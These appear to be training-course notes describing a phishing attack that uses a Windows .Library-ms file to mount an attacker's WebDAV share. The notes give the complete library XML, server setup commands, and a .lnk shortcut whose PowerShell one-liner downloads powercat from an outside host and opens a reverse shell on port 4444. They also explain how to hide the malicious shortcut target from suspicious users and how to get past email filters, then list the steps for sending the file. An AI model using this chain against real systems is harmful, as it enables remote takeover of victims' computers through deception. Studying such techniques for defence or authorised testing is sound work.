
Windows library files are virtual containers for user content. They connect users with data stored in remote locations like webservices or shares. `.Libaray-ms` file types executed by double clicking in windows explorer.

`.Library-ms` file type can generally make it through emails filters - so we will utilize this file to enable the target to open our WebDAV locally on their computer (like a remote share). On this WebDAV server we will serve our malicious `.lnk` file which will run a malicious powershell payload to obtain a reverse shell. 

`.lnk` files will generally get filtered out quite easily so we manipulate the victim into downloading one through our library file.


#### Setting Up WebDAV to serve .lnk file

1. `pip3 install wsgidav` - install this to enable python to host a webdav server on our machine.
2. `mkdir /home/kali/webdav` - create our root directory for our webdav share
3. `touch /home/kali/webdav/test.txt` - create a file inside of our share for testing.
4. `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav` - run the command to host our webdav server - if `wsgidav` was installed using apt - use the `wsgidav` command instead.


#### Creating Windows Library File

`These steps need to be repeated everytime the file is run - due the windows trying to optimise for webdave and serialzing data and changing the url to be more optimal - the file will only work on the computer it is run on - and may not work again after computer is restarted` - save the initial xml separately and use over and over.

Open VS Code, create a new text file and save it as `config.Library-ms`.

###### step 1: include the namespace for the library file

This namespace is for the version of the library file format starting from windows 7.

all further tags are placed inside of the `library description`.

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

###### step 2: add library information tags

name tag is the name of the library - it is not an arbitrary random name. It is a `.dll` and an index. for this we can also use `@shell32` but it is more likely to be flagged.

version can be set to a numerical value of out choice.

```
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

###### step 3: add isLibraryPinned & icon reference

Specifies if the library is pinned to the navigation pane in windows explorer. - Used to manipulate target into thinking this is more genuine and legit.

Icon references decided which icon is displayed. `imageres.dll` allows us to choose between all the windows icon to display.

`-1002` is the documents folder icon
`-1003` is the pictures folder icon

```
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```


###### step 4: templateInfo

contains the `folderType` tags. which determine the columns and details that appear in the windows explorer by default.

We need to specify a GUID that we can look up on the Microsoft Documentation webpage. This example uses the Documents GUID to appear convincing.

```
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```


###### step 5: setting library locations

Here we specify the storage location where our library file will point to.

`searchConnectoreDescriptionList` contains a list of search containers. defined by `searchConnectorDescription`.

Search connectors are used by library files to specify the connection settings to a remote location.

We can specify more than one `searchConnectorDescription` inside of `searchConnectorDescriptionList`.

`isDefaultSaveLocation` determines behavior of windows explorer when a user choses to save an item.
`isSupported` is used for compatibility - not present in the documentation.

`simpleLocation` contains our `url` which will point to our webdav server.

```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```


#### Creating the .lnk shortcut file.

1. right click on windows desktop>new shortcut.
2. Enter the command we want to run in the `Type the location of the item:` input

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

3. press next
4. Give appropriate name to shortcut

`If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.`

`Instead of using a Python3 web server to serve Powercat, we could also host it on the WebDAV share. However, as our WebDAV share is writable, AV and other security solutions could remove or quarantine our payload. If we configure the WebDAV share as read-only, we'd lose a great method of transferring files from target systems. Throughout this course, we'll use a Python3 web server to serve our payload for attacks utilizing Windows Library files.`


#### Conducting the attack

1. `nc -nvlp 4444` - our reverse listener for the connection
2. `python3 -m http.server 8000` - our powercat server to server powercat
3. `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav` - ensure our webdav server is running
4. send config file via email and wait.

